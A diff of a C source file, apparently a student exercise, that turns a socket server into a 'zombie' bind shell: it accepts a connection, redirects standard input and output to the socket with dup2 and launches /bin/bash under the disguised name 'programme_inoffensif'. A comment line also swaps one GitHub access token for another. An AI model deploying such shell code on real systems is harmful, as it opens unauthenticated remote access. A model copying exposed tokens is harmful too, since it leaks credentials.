@@ -13,45 +13,49 @@
 #include <sys/sem.h>
 #include <sys/shm.h>
 #include <sys/socket.h>
-//	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
+//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
 #include "utils_v2.h"
-#include "header.h"
+#include "port.h"
+#include "zombie.h"
 
-int initSocketServer(){
+Zombie initSocketServer(){
 	int sockfd = ssocket();
 	sbind(PORT, sockfd);
 	slisten(sockfd, BACKLOG);
-	return sockfd;
+	Zombie zombie= {
+		"zombie.c", "127.0.0.1", PORT, sockfd,getpid() 
+	};
+	return zombie;
 }
 
-void process (void* droit){
+void createBash (void * sock){
+	int* socket = sock;
+	for (int i = 0; i < 3; ++i){
+		dup2(*socket,i);
+	}
 	sexecl("/bin/bash", "programme_inoffensif", NULL);
-	printf("(tezatzaetzea)\n");
 
+}
+
+void done(){
+	printf("fini\n");
+	exit(0);
 }
 
 int main(int argc, char const *argv[]){
-	int sockfd = initSocketServer();
-	printf("Le serveur tourne sur le port : %i \n", PORT);
-	Zombie zombie= {
-		"zombie.c", "127.0.0.1", PORT, sockfd 
-	};
-
-	int newsockfd = accept(sockfd,NULL,NULL);
+	ssigaction(SIGINT,done);
+	Zombie zombie = initSocketServer();
+	printf("Le serveur tourne sur le port : %i \n", PORT);	
+	int newsockfd = saccept(zombie.sockFd);
 	swrite(newsockfd, &zombie, sizeof(Zombie));
 
-	int child = fork_and_run1(process,"0666");
+	fork_and_run1(createBash,&newsockfd);
+	while(1){
+		sleep(10);
+	};
+	sclose(newsockfd);
+	sclose(zombie.sockFd);
 
-	while(true){
-		printf("j'attends\n");
-	}
-
-	sclose(sockfd);
-	int status;
-	swaitpid(child,&status,0);
-
-
-	// fait un new process
 	return 0;
 }
 
